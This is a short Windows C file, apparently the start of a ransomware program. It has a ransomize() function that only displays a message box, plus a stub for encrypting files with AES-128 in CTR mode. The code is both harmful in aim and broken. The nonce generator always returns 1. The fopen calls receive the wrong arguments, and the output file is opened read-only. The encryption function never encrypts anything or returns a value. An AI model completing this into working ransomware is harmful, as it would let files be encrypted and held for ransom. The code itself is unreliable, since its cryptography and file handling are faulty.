#include <windows.h>

#include <stdio.h>
#include <stdint.h>

void ransomize(void)
{
    MessageBoxA(NULL, "ransomize() was called!", "Ransomware", MB_OK);
    // TODO: ransomware here
}

/*
    Generate a random stream of 64 bits.
*/
uint64_t get_nonce(void)
{
    // TODO
    return 1;
}

/*
    Encrypt a file using the AES-128 in the CTR mode.
*/
int encypt_file_aes(const char *source, const char *target, const char *key)
{
    FILE *infile = NULL;
    FILE *outfile = NULL;

    // Open files
    infile = fopen(infile, "rb");
    if (!infile)
    {
        // handle error
    }
    outfile = fopen(outfile, "rb");
    if (!outfile)
    {
        // handle error
    }
    // TODO: check input size 0 ?

    // Add padding. Put EOF in the end

    // Counter. The first 64 bits is the nonce, the latter 64 bits is the counter starting from 1.
    uint64_t ctr[2];
    ctr[0] = get_nonce();
    ctr[1] = 1;

    // Write the nonce into the file? Maybe in metadata?
}